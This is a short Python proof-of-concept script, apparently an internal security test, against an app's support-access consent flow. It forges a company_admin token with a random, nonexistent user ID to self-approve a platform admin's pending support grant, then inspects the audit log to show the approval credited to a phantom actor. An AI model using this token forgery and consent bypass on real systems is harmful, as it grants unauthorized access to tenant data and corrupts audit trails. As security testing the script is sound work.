

async def main():
    async with _client() as c:
        plat = await platform_login(c)
        org = await provision_company(c, plat, "consent-bg003")
        org_id = org["org_id"]
        print("== ORG ==", org_id, org["slug"])

        # 1. Platform admin REQUESTS a grant (pending consent).
        r = await request_support(c, plat, org_id)
        grant_id = r.json()["id"]
        print("== REQUEST ==", r.status_code, "grant", grant_id, "status", r.json()["status"])

        # 2. Forge a company_admin token with a RANDOM sub (no real user) + org_id=<target>.
        forged_sub = str(uuid4())
        forged = forge_company_token(sub=forged_sub, org_id=org_id, role="company_admin")
        print("== FORGED token sub (random, no user) ==", forged_sub)

        # 3. Self-approve with the FORGED token.
        ap = await c.post(f"/support-access/{grant_id}/approve", headers=bearer(forged))
        body = ap.json()
        print("== FORGED approve status ==", ap.status_code)
        print("status      :", body.get("status"))
        print("is_active   :", body.get("is_active"))
        print("expires_at  :", body.get("expires_at"))
        print("decided_at  :", body.get("decided_at"))
        print("decided_by  :", body.get("decided_by_email"))
        print("== FULL BODY ==", body)

        # 4. Audit trail: the support.approved event attributed to the phantom actor.
        au = await get_org_audit(c, plat, org_id)
        events = [
            {"action": e["action"], "actor_id": e.get("actor_id"),
             "actor_email": e.get("actor_email")}
            for e in au.json() if e["action"].startswith("support.")
        ]
        print("== AUDIT support.* events ==", events)
        print("== FORGED sub (for psql cross-check) ==", forged_sub)

asyncio.run(main())
